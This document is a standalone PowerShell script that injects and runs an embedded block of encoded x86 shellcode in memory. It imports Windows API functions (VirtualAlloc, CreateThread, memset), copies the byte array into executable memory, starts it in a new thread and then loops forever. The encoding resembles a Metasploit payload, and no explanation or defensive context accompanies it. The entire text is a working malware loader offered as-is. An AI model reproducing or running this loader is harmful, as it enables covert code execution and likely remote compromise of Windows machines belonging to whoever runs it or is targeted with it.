
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xca,0xbf,0x5e,0x83,0x44,0x0e,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0x31,0x78,0x18,0x03,0x78,0x18,0x83,0xe8,0xa2,0x61,0xb1,0xf2,0xb2,0xe4,0x3a,0x0b,0x42,0x89,0xb3,0xee,0x73,0x89,0xa0,0x7b,0x23,0x39,0xa2,0x2e,0xcf,0xb2,0xe6,0xda,0x44,0xb6,0x2e,0xec,0xed,0x7d,0x09,0xc3,0xee,0x2e,0x69,0x42,0x6c,0x2d,0xbe,0xa4,0x4d,0xfe,0xb3,0xa5,0x8a,0xe3,0x3e,0xf7,0x43,0x6f,0xec,0xe8,0xe0,0x25,0x2d,0x82,0xba,0xa8,0x35,0x77,0x0a,0xca,0x14,0x26,0x01,0x95,0xb6,0xc8,0xc6,0xad,0xfe,0xd2,0x0b,0x8b,0x49,0x68,0xff,0x67,0x48,0xb8,0xce,0x88,0xe7,0x85,0xff,0x7a,0xf9,0xc2,0xc7,0x64,0x8c,0x3a,0x34,0x18,0x97,0xf8,0x47,0xc6,0x12,0x1b,0xef,0x8d,0x85,0xc7,0x0e,0x41,0x53,0x83,0x1c,0x2e,0x17,0xcb,0x00,0xb1,0xf4,0x67,0x3c,0x3a,0xfb,0xa7,0xb5,0x78,0xd8,0x63,0x9e,0xdb,0x41,0x35,0x7a,0x8d,0x7e,0x25,0x25,0x72,0xdb,0x2d,0xcb,0x67,0x56,0x6c,0x83,0x44,0x5b,0x8f,0x53,0xc3,0xec,0xfc,0x61,0x4c,0x47,0x6b,0xc9,0x05,0x41,0x6c,0x2e,0x3c,0x35,0xe2,0xd1,0xbf,0x46,0x2a,0x15,0xeb,0x16,0x44,0xbc,0x94,0xfc,0x94,0x41,0x41,0x68,0x90,0xd5,0x25,0xd9,0x01,0xe7,0xd2,0x23,0x36,0xf6,0x7e,0xad,0xd0,0xa8,0x2e,0xfd,0x4c,0x08,0x9f,0xbd,0x3c,0xe0,0xf5,0x31,0x62,0x10,0xf6,0x9b,0x0b,0xba,0x19,0x72,0x63,0x52,0x83,0xdf,0xff,0xc3,0x4c,0xca,0x85,0xc3,0xc7,0xf9,0x7a,0x8d,0x2f,0x77,0x69,0x79,0xc0,0xc2,0xd3,0x2f,0xdf,0xf8,0x7e,0xcf,0x75,0x07,0x29,0x98,0xe1,0x05,0x0c,0xee,0xad,0xf6,0x7b,0x65,0x67,0x63,0xc4,0x11,0x88,0x63,0xc4,0xe1,0xde,0xe9,0xc4,0x89,0x86,0x49,0x97,0xac,0xc8,0x47,0x8b,0x7d,0x5d,0x68,0xfa,0xd2,0xf6,0x00,0x00,0x0d,0x30,0x8f,0xfb,0x78,0xc0,0xf3,0x2d,0x44,0xb6,0x1d,0xee;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

